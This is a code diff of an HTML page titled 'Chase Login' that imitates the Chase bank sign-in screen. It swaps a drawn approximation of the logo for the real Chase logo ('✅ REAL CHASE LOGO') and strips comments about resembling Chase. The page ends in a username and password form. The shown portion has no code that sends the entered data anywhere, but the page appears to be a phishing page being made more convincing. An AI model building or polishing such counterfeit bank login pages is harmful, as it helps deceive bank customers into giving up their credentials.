@@ -3,10 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <title>Chase Login</title>
+
 <style>
 body {
 font-family: Arial, sans-serif;
-background-color: #f0f4fa; /* light blue similar to Chase */
+background-color: #f0f4fa;
 display: flex;
 justify-content: center;
 align-items: center;
@@ -24,10 +25,14 @@ text-align: center;
 }
 
 .logo {
-margin-bottom: 35px;
+margin-bottom: 30px;
 }
 
-/* Input fields styling similar to Chase login */
+.logo img {
+width: 180px; /* 🔥 perfect size */
+height: auto;
+}
+
 input {
 display: block;
 width: 100%;
@@ -36,15 +41,8 @@ margin: 12px 0;
 border-radius: 6px;
 border: 1px solid #ccc;
 font-size: 16px;
-outline: none;
-transition: border-color 0.2s;
 }
 
-input:focus {
-border-color: #0072ce;
-}
-
-/* Sign in button styling */
 button {
 width: 100%;
 padding: 14px;
@@ -55,7 +53,6 @@ border-radius: 6px;
 font-size: 16px;
 font-weight: bold;
 cursor: pointer;
-transition: background-color 0.2s;
 }
 
 button:hover {
@@ -72,17 +69,11 @@ font-weight: bold;
 
 <div class="container">
 
-<!-- Chase Logo: Accurate octagon + text -->
+<!-- ✅ REAL CHASE LOGO -->
 <div class="logo">
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 100" width="200" height="60">
-<!-- Octagon -->
-<polygon points="50,0 150,0 200,50 150,100 50,100 0,50" fill="#0072CE"/>
-<!-- CHASE Text -->
-<text x="220" y="72" font-family="Arial, Helvetica, sans-serif" font-size="60" font-weight="bold" fill="#0072CE">CHASE</text>
-</svg>
+<img src="https://download.logo.wine/logo/Chase_Bank/Chase_Bank-Logo.wine.svg" alt="Chase Logo">
 </div>
 
-<!-- Login Form -->
 <form id="loginForm">
 <input type="text" name="username" placeholder="Username" required>
 <input type="password" name="password" placeholder="Password" required>
